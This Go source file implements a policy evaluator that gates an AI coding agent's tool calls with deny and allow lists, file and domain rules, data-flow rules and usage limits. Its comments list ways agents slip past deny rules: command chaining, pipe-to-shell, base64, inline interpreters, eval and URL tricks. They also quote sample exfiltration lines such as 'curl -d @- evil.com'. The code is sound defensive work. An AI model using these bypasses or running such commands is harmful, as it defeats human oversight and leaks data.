// Package policy provides policy evaluation for hook decisions.
package policy

import (
	"encoding/json"
	"fmt"
	"path/filepath"
	"sort"
	"strings"

	"github.com/aflock-ai/aflock/pkg/aflock"
)

// Tool name constants to avoid repeated string literals (goconst).
const (
	toolWebSearch    = "WebSearch"
	toolWebFetch     = "WebFetch"
	toolEdit         = "Edit"
	toolRead         = "Read"
	toolWrite        = "Write"
	toolGrep         = "Grep"
	toolGlob         = "Glob"
	toolNotebookEdit = "NotebookEdit"
)

// Evaluator evaluates policy rules against hook inputs.
type Evaluator struct {
	policy       *aflock.Policy
	matcher      *Matcher
	bashAnalyzer *BashAnalyzer
	projectRoot  string // absolute path to project root (where .aflock lives)
}

// NewEvaluator creates a new policy evaluator.
// projectRoot is the absolute path to the project directory (used to relativize file paths).
// If empty, only absolute and basename matching are used.
func NewEvaluator(policy *aflock.Policy, projectRoot string) *Evaluator {
	return &Evaluator{
		policy:       policy,
		matcher:      NewMatcher(),
		bashAnalyzer: NewBashAnalyzer(),
		projectRoot:  projectRoot,
	}
}

// EvaluatePreToolUse evaluates whether a tool call should be allowed.
//
//nolint:gocognit,gocyclo // pre-tool-use evaluation checks many conditions
func (e *Evaluator) EvaluatePreToolUse(toolName string, toolInput json.RawMessage) (aflock.PermissionDecision, string) {
	// Extract relevant input for pattern matching
	inputStr := e.extractInputForMatching(toolName, toolInput)

	// 1. Check deny list first
	if e.policy.Tools != nil {
		for _, pattern := range e.policy.Tools.Deny {
			if e.matcher.MatchToolPattern(pattern, toolName, inputStr) {
				return aflock.DecisionDeny, fmt.Sprintf("Tool '%s' matches deny pattern '%s'", toolName, pattern)
			}
		}

		// For Bash commands, also check sub-commands and obfuscation patterns
		// against deny rules. This catches bypass attempts like command chaining,
		// base64 encoding, interpreter invocation, and variable indirection.
		if toolName == "Bash" && inputStr != "" && len(e.policy.Tools.Deny) > 0 {
			if decision, reason := e.evaluateBashBypass(inputStr); decision != aflock.DecisionAllow {
				return decision, reason
			}
		}
	}

	// 2. Check requireApproval patterns
	if e.policy.Tools != nil {
		for _, pattern := range e.policy.Tools.RequireApproval {
			if e.matcher.MatchToolPattern(pattern, toolName, inputStr) {
				return aflock.DecisionAsk, fmt.Sprintf("Tool '%s' requires approval (matches '%s')", toolName, pattern)
			}
		}
	}

	// 3. Check file access for file-related tools
	if isFileOperation(toolName) {
		decision, reason := e.evaluateFileAccess(toolName, toolInput)
		if decision != aflock.DecisionAllow {
			return decision, reason
		}
	}

	// 4. Check domain access for network tools
	// WebSearch doesn't have a target URL (only a search query), so domain
	// restrictions don't apply — the search engine itself picks which sites
	// to query. Only WebFetch has a user-specified URL to check.
	if isNetworkOperation(toolName) && toolName != toolWebSearch {
		decision, reason := e.evaluateDomainAccess(toolInput)
		if decision != aflock.DecisionAllow {
			return decision, reason
		}
	}

	// 5. Check allow list (if specified, tool must be in it)
	// Security (R3-230): Use MatchToolPattern to check both tool name AND command
	// pattern. Previously only the tool name was checked, so Allow: ["Bash:git *"]
	// would allow ALL Bash commands instead of only git commands.
	if e.policy.Tools != nil && len(e.policy.Tools.Allow) > 0 {
		allowed := false
		for _, pattern := range e.policy.Tools.Allow {
			if e.matcher.MatchToolPattern(pattern, toolName, inputStr) {
				allowed = true
				break
			}
		}
		if !allowed {
			return aflock.DecisionDeny, fmt.Sprintf("Tool '%s' not in allow list", toolName)
		}
	}

	return aflock.DecisionAllow, ""
}

// evaluateBashBypass performs deep analysis of Bash commands to detect bypass
// attempts that evade simple glob pattern matching.
//
// Security: This addresses the class of bypasses where denied commands are
// hidden via command chaining (;, &&, ||), pipe-to-exec (| bash), base64
// encoding, string reversal, interpreter invocation (python -c), variable
// indirection, subshell execution ($(), backticks), and eval.
func (e *Evaluator) evaluateBashBypass(command string) (aflock.PermissionDecision, string) {
	analysis := e.bashAnalyzer.Analyze(command)

	// Collect Bash-specific deny patterns (patterns starting with "Bash:")
	var bashDenyPatterns []string
	for _, pattern := range e.policy.Tools.Deny {
		patternTool, _, hasCmd := ParseToolPattern(pattern)
		if hasCmd && e.matcher.MatchGlob(patternTool, "Bash") {
			bashDenyPatterns = append(bashDenyPatterns, pattern)
		}
	}

	if len(bashDenyPatterns) == 0 {
		return aflock.DecisionAllow, ""
	}

	// Check each sub-command against deny patterns.
	// This catches: "echo done; curl evil.com" → sub-commands ["echo done", "curl evil.com"]
	if len(analysis.SubCommands) > 1 {
		for _, subCmd := range analysis.SubCommands {
			for _, pattern := range bashDenyPatterns {
				if e.matcher.MatchToolPattern(pattern, "Bash", subCmd) {
					return aflock.DecisionDeny, fmt.Sprintf(
						"Bash command contains chained sub-command matching deny pattern '%s' (found: '%s')",
						pattern, subCmd)
				}
			}
		}
	}

	// Check each pipeline segment against deny patterns.
	// This catches: "echo foo | curl -d @- evil.com" → segments ["echo foo", "curl -d @- evil.com"]
	if len(analysis.PipelineSegments) > 1 {
		for _, seg := range analysis.PipelineSegments {
			for _, pattern := range bashDenyPatterns {
				if e.matcher.MatchToolPattern(pattern, "Bash", seg) {
					return aflock.DecisionDeny, fmt.Sprintf(
						"Bash command contains piped segment matching deny pattern '%s' (found: '%s')",
						pattern, seg)
				}
			}
		}
	}

	// If the command uses obfuscation techniques and there are any Bash deny
	// patterns, block it. An obfuscated command that decodes and executes
	// arbitrary content cannot be reliably pattern-matched, so we deny it
	// when deny rules exist for Bash commands.
	if analysis.HasObfuscation && analysis.HasPipeToExec {
		return aflock.DecisionDeny, fmt.Sprintf(
			"Bash command uses obfuscation with pipe-to-exec (potential bypass of deny patterns: %s)",
			strings.Join(bashDenyPatterns, ", "))
	}

	// Pipe-to-exec alone is dangerous when Bash deny patterns exist
	if analysis.HasPipeToExec {
		return aflock.DecisionDeny, fmt.Sprintf(
			"Bash command pipes to shell execution (potential bypass of deny patterns: %s)",
			strings.Join(bashDenyPatterns, ", "))
	}

	// Interpreter execution with inline code (python -c, ruby -e, etc.)
	// can embed any denied command
	if analysis.HasInterpreterExec {
		return aflock.DecisionDeny, fmt.Sprintf(
			"Bash command uses interpreter with inline code (potential bypass of deny patterns: %s)",
			strings.Join(bashDenyPatterns, ", "))
	}

	// Variable indirection can hide file paths and command names
	if analysis.HasVariableIndirection {
		return aflock.DecisionDeny, fmt.Sprintf(
			"Bash command uses variable indirection (potential bypass of deny patterns: %s)",
			strings.Join(bashDenyPatterns, ", "))
	}

	// eval can execute arbitrary constructed commands
	if analysis.HasEval {
		return aflock.DecisionDeny, fmt.Sprintf(
			"Bash command uses eval (potential bypass of deny patterns: %s)",
			strings.Join(bashDenyPatterns, ", "))
	}

	// Subshell execution can embed denied commands
	if analysis.HasSubshellExec {
		return aflock.DecisionDeny, fmt.Sprintf(
			"Bash command uses subshell execution (potential bypass of deny patterns: %s)",
			strings.Join(bashDenyPatterns, ", "))
	}

	return aflock.DecisionAllow, ""
}

// extractInputForMatching extracts the relevant string from tool input for pattern matching.
//
//nolint:gocyclo // input extraction maps tool types to fields
func (e *Evaluator) extractInputForMatching(toolName string, toolInput json.RawMessage) string {
	switch toolName {
	case "Bash":
		var input aflock.BashToolInput
		if err := json.Unmarshal(toolInput, &input); err == nil {
			return input.Command
		}
	case toolRead, toolWrite, toolEdit:
		var input aflock.FileToolInput
		if err := json.Unmarshal(toolInput, &input); err == nil {
			return input.FilePath
		}
	case toolGlob:
		var input aflock.GlobToolInput
		if err := json.Unmarshal(toolInput, &input); err == nil {
			if input.Path != "" {
				return input.Path
			}
			return input.Pattern
		}
	case toolGrep:
		var input aflock.GrepToolInput
		if err := json.Unmarshal(toolInput, &input); err == nil {
			if input.Path != "" {
				return input.Path
			}
			return input.Pattern
		}
	case toolNotebookEdit:
		var input aflock.NotebookEditToolInput
		if err := json.Unmarshal(toolInput, &input); err == nil {
			return input.NotebookPath
		}
	case "Task":
		var input aflock.TaskToolInput
		if err := json.Unmarshal(toolInput, &input); err == nil {
			return input.Prompt
		}
	case toolWebFetch:
		var input aflock.WebFetchToolInput
		if err := json.Unmarshal(toolInput, &input); err == nil {
			return input.URL
		}
	case toolWebSearch:
		var input aflock.WebSearchToolInput
		if err := json.Unmarshal(toolInput, &input); err == nil {
			return input.Query
		}
	}
	return ""
}

// extractFilePath extracts the file path from tool input, handling different tool input formats.
// Different tools use different JSON field names for their path:
//   - Read/Write/Edit: "file_path"
//   - Grep/Glob: "path" (optional, defaults to CWD)
//   - NotebookEdit: "notebook_path"
//
// Returns (path, error). A nil error with empty path means the JSON was valid but the
// path field was empty/missing (normal for Glob/Grep where path defaults to CWD).
// A non-nil error means malformed JSON (fail-closed).
func extractFilePath(toolName string, toolInput json.RawMessage) (string, error) {
	switch toolName {
	case toolGlob:
		var input aflock.GlobToolInput
		if err := json.Unmarshal(toolInput, &input); err != nil {
			return "", fmt.Errorf("failed to parse file tool input: %w", err)
		}
		return input.Path, nil
	case toolGrep:
		var input aflock.GrepToolInput
		if err := json.Unmarshal(toolInput, &input); err != nil {
			return "", fmt.Errorf("failed to parse file tool input: %w", err)
		}
		return input.Path, nil
	case toolNotebookEdit:
		var input aflock.NotebookEditToolInput
		if err := json.Unmarshal(toolInput, &input); err != nil {
			return "", fmt.Errorf("failed to parse file tool input: %w", err)
		}
		return input.NotebookPath, nil
	default:
		var input aflock.FileToolInput
		if err := json.Unmarshal(toolInput, &input); err != nil {
			return "", fmt.Errorf("failed to parse file tool input: %w", err)
		}
		return input.FilePath, nil
	}
}

// filePathVariants returns all path forms to try when matching against glob patterns.
// This handles the mismatch between relative policy patterns (e.g., "src/**") and
// absolute paths from Claude Code (e.g., "/Users/.../src/main.go").
func (e *Evaluator) filePathVariants(filePath string) []string {
	variants := []string{filepath.Clean(filePath), filePath}

	// Add basename (e.g., "main.go" from "/Users/.../src/main.go")
	base := filepath.Base(filePath)
	if base != filePath {
		variants = append(variants, base)
	}

	// Add path relative to project root (most important for matching policy patterns)
	if e.projectRoot != "" {
		absPath := filePath
		if !filepath.IsAbs(absPath) {
			absPath = filepath.Join(e.projectRoot, absPath)
		}
		relPath, err := filepath.Rel(e.projectRoot, absPath)
		if err == nil && relPath != filePath && !strings.HasPrefix(relPath, "..") {
			variants = append(variants, relPath)
		}
	}

	return variants
}

// matchFilePattern checks if any path variant matches the glob pattern.
func (e *Evaluator) matchFilePattern(pattern string, variants []string) bool {
	for _, v := range variants {
		if e.matcher.MatchGlob(pattern, v) {
			return true
		}
	}
	return false
}

// isDirectoryTool returns true for tools that scan directories rather than access individual files.
// These tools (Glob, Grep) take a starting directory and search within it. Their "path" is a
// search root, not a specific file being accessed.
func isDirectoryTool(toolName string) bool {
	return toolName == toolGlob || toolName == toolGrep
}

// evaluateFileAccess checks file access against policy.
//
//nolint:gocognit,gocyclo // file access evaluation has complex path logic
func (e *Evaluator) evaluateFileAccess(toolName string, toolInput json.RawMessage) (aflock.PermissionDecision, string) {
	if e.policy.Files == nil {
		return aflock.DecisionAllow, ""
	}

	filePath, err := extractFilePath(toolName, toolInput)
	if err != nil {
		// Malformed JSON — fail-closed
		return aflock.DecisionDeny, err.Error()
	}

	if filePath == "" {
		// Valid JSON but no path specified.
		// For directory tools (Glob/Grep), path is optional (defaults to CWD) — allow.
		if isDirectoryTool(toolName) {
			return aflock.DecisionAllow, ""
		}
		// For other file tools, empty path won't match any allow patterns, so fall
		// through to the allow-list check below which will deny appropriately.
	}

	// Build all path variants for matching (absolute, relative, basename)
	variants := e.filePathVariants(filePath)

	// Check deny patterns first
	for _, pattern := range e.policy.Files.Deny {
		if e.matchFilePattern(pattern, variants) {
			return aflock.DecisionDeny, fmt.Sprintf("File '%s' matches deny pattern '%s'", filePath, pattern)
		}
		// For directory tools, also check if children of this directory would match deny.
		// e.g., if searching from "secrets/" and deny has "**/secrets/**", the directory
		// itself might not match but files within it would.
		if isDirectoryTool(toolName) {
			for _, v := range variants {
				childPath := v + "/child"
				if e.matcher.MatchGlob(pattern, childPath) {
					return aflock.DecisionDeny, fmt.Sprintf("Directory '%s' contains denied files (matches '%s')", filePath, pattern)
				}
			}
		}
	}

	// Check readOnly for write operations
	if toolName == toolWrite || toolName == toolEdit {
		for _, pattern := range e.policy.Files.ReadOnly {
			if e.matchFilePattern(pattern, variants) {
				return aflock.DecisionDeny, fmt.Sprintf("File '%s' is read-only (matches '%s')", filePath, pattern)
			}
		}
	}

	// Check allow patterns (if specified, file must match)
	if len(e.policy.Files.Allow) > 0 {
		allowed := false
		for _, pattern := range e.policy.Files.Allow {
			if e.matchFilePattern(pattern, variants) {
				allowed = true
				break
			}
		}

		// For directory tools (Glob, Grep), if the path is the project root (".")
		// or resolves to it, allow the search. These tools scan directories and return
		// results — they don't write or modify files. The deny patterns above already
		// block access to sensitive directories, and individual file Read/Write/Edit
		// operations have their own allow checks.
		if !allowed && isDirectoryTool(toolName) {
			for _, v := range variants {
				if v == "." {
					allowed = true
					break
				}
				// Also check if any child of this directory would match an allow pattern
				childPath := v + "/child"
				for _, pattern := range e.policy.Files.Allow {
					if e.matcher.MatchGlob(pattern, childPath) {
						allowed = true
						break
					}
				}
				if allowed {
					break
				}
			}
		}

		if !allowed {
			return aflock.DecisionDeny, fmt.Sprintf("File '%s' not in allow list", filePath)
		}
	}

	return aflock.DecisionAllow, ""
}

// evaluateDomainAccess checks domain access against policy.
func (e *Evaluator) evaluateDomainAccess(toolInput json.RawMessage) (aflock.PermissionDecision, string) {
	if e.policy.Domains == nil {
		return aflock.DecisionAllow, ""
	}

	var input aflock.WebFetchToolInput
	if err := json.Unmarshal(toolInput, &input); err != nil {
		return aflock.DecisionDeny, fmt.Sprintf("failed to parse network tool input: %v", err)
	}

	domain := extractDomain(input.URL)
	if domain == "" {
		return aflock.DecisionDeny, "empty domain in network request"
	}

	// Check deny patterns first
	for _, pattern := range e.policy.Domains.Deny {
		if e.matcher.MatchGlob(pattern, domain) {
			return aflock.DecisionDeny, fmt.Sprintf("Domain '%s' matches deny pattern '%s'", domain, pattern)
		}
	}

	// Check allow patterns (if specified, domain must match)
	if len(e.policy.Domains.Allow) > 0 {
		allowed := false
		for _, pattern := range e.policy.Domains.Allow {
			if e.matcher.MatchGlob(pattern, domain) {
				allowed = true
				break
			}
		}
		if !allowed {
			return aflock.DecisionDeny, fmt.Sprintf("Domain '%s' not in allow list", domain)
		}
	}

	return aflock.DecisionAllow, ""
}

func isFileOperation(toolName string) bool {
	switch toolName {
	case toolRead, toolWrite, toolEdit, toolGlob, toolGrep, toolNotebookEdit:
		return true
	default:
		return false
	}
}

func isNetworkOperation(toolName string) bool {
	switch toolName {
	case toolWebFetch, toolWebSearch:
		return true
	default:
		return false
	}
}

func extractDomain(rawURL string) string {
	// Case-insensitive scheme stripping — URLs like HTTPS://evil.com or Http://evil.com
	// must be handled correctly to prevent domain deny rule bypasses.
	lower := strings.ToLower(rawURL)
	if strings.HasPrefix(lower, "https://") {
		rawURL = rawURL[len("https://"):]
	} else if strings.HasPrefix(lower, "http://") {
		rawURL = rawURL[len("http://"):]
	}

	// Security (R3-231): Strip protocol-relative URL prefix.
	// Without this, //evil.com extracts "//evil.com" which won't match
	// deny patterns like "evil.com".
	rawURL = strings.TrimLeft(rawURL, "/")

	// Strip path first
	if idx := strings.Index(rawURL, "/"); idx != -1 {
		rawURL = rawURL[:idx]
	}

	// Security: strip userinfo (user:pass@) before extracting host.
	// Without this, https://user:pass@evil.com extracts "user" instead of
	// "evil.com", allowing domain deny rule bypass (R3-122).
	if idx := strings.LastIndex(rawURL, "@"); idx != -1 {
		rawURL = rawURL[idx+1:]
	}

	// Strip port
	if idx := strings.Index(rawURL, ":"); idx != -1 {
		rawURL = rawURL[:idx]
	}

	// Security (R3-236): Normalize domain to lowercase.
	// DNS is case-insensitive (RFC 4343), so EVIL.COM and evil.com are
	// the same domain. Without this, deny rules for "evil.com" wouldn't
	// block "EVIL.COM".
	rawURL = strings.ToLower(rawURL)

	return rawURL
}

// EvaluateDataFlow checks if an operation violates data flow rules.
// For source operations (reads), it returns materials to track.
// For sink operations (writes), it checks materials against rules.
//
//nolint:gocognit,gocyclo // data flow evaluation checks many tool x label combos
func (e *Evaluator) EvaluateDataFlow(toolName string, toolInput json.RawMessage, materials []aflock.MaterialClassification) (aflock.PermissionDecision, string, *aflock.MaterialClassification) {
	if e.policy.DataFlow == nil {
		return aflock.DecisionAllow, "", nil
	}

	inputStr := e.extractInputForMatching(toolName, toolInput)
	toolPattern := fmt.Sprintf("%s:%s", toolName, inputStr)

	// Get current material labels
	currentLabels := make([]string, 0, len(materials))
	for _, m := range materials {
		currentLabels = append(currentLabels, m.Label)
	}

	// Check classifications to see what label this tool has.
	// Sort labels for deterministic evaluation — Go map iteration is non-deterministic,
	// so without sorting, the same input could match different labels on different runs.
	classifyLabels := make([]string, 0, len(e.policy.DataFlow.Classify))
	for label := range e.policy.DataFlow.Classify {
		classifyLabels = append(classifyLabels, label)
	}
	sort.Strings(classifyLabels)

	var matchedLabel string
	for _, label := range classifyLabels {
		patterns := e.policy.DataFlow.Classify[label]
		for _, pattern := range patterns {
			if e.matcher.MatchToolPattern(pattern, toolName, inputStr) {
				matchedLabel = label
				break
			}
		}
		if matchedLabel != "" {
			break
		}
	}

	// If this is a read operation (not a sink in flow rules), track the material
	if matchedLabel != "" && isReadOperation(toolName) {
		// Check if we already have this label
		if !containsString(currentLabels, matchedLabel) {
			return aflock.DecisionAllow, "", &aflock.MaterialClassification{
				Label:  matchedLabel,
				Source: toolPattern,
			}
		}
	}

	// If this is a write operation, check flow rules
	if matchedLabel != "" && isWriteOperation(toolName) { //nolint:nestif
		sinkLabel := matchedLabel

		// Check all flow rules
		for _, rule := range e.policy.DataFlow.FlowRules {
			sourceLabel, ruleSinkLabel, ok := aflock.ParseDataFlowRule(rule.Deny)
			if !ok {
				continue
			}
			if ruleSinkLabel != sinkLabel {
				continue
			}
			// Check if we have the source label in our materials
			if containsString(currentLabels, sourceLabel) {
				msg := rule.Message
				if msg == "" {
					msg = fmt.Sprintf("Data flow violation: %s data cannot be written to %s destination (%s)",
						sourceLabel, sinkLabel, toolPattern)
				}
				return aflock.DecisionDeny, msg, nil
			}
		}
	}

	return aflock.DecisionAllow, "", nil
}

func isReadOperation(toolName string) bool {
	switch toolName {
	case toolRead, toolGlob, toolGrep, toolWebFetch, toolWebSearch:
		return true
	default:
		return strings.HasPrefix(toolName, "mcp__") && !strings.Contains(toolName, "write")
	}
}

func isWriteOperation(toolName string) bool {
	switch toolName {
	case toolWrite, toolEdit, "Bash":
		return true
	default:
		return strings.HasPrefix(toolName, "mcp__") && strings.Contains(toolName, "write")
	}
}

func containsString(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}

// CheckLimits checks if cumulative metrics exceed policy limits.
// Returns (exceeded, limitName, message).
func (e *Evaluator) CheckLimits(metrics *aflock.SessionMetrics, enforcementMode string) (bool, string, string) {
	if e.policy.Limits == nil {
		return false, "", ""
	}

	// Only check limits with matching enforcement mode
	checkLimit := func(limit *aflock.Limit, name string, current float64) (bool, string, string) {
		if limit == nil {
			return false, "", ""
		}
		if limit.Enforcement != enforcementMode {
			return false, "", ""
		}
		if current > limit.Value {
			return true, name, fmt.Sprintf("%s exceeded: %.2f > %.2f", name, current, limit.Value)
		}
		return false, "", ""
	}

	if exceeded, name, msg := checkLimit(e.policy.Limits.MaxSpendUSD, "maxSpendUSD", metrics.CostUSD); exceeded {
		return true, name, msg
	}
	if exceeded, name, msg := checkLimit(e.policy.Limits.MaxTokensIn, "maxTokensIn", float64(metrics.TokensIn)); exceeded {
		return true, name, msg
	}
	if exceeded, name, msg := checkLimit(e.policy.Limits.MaxTokensOut, "maxTokensOut", float64(metrics.TokensOut)); exceeded {
		return true, name, msg
	}
	if exceeded, name, msg := checkLimit(e.policy.Limits.MaxTurns, "maxTurns", float64(metrics.Turns)); exceeded {
		return true, name, msg
	}
	if exceeded, name, msg := checkLimit(e.policy.Limits.MaxToolCalls, "maxToolCalls", float64(metrics.ToolCalls)); exceeded {
		return true, name, msg
	}

	return false, "", ""
}
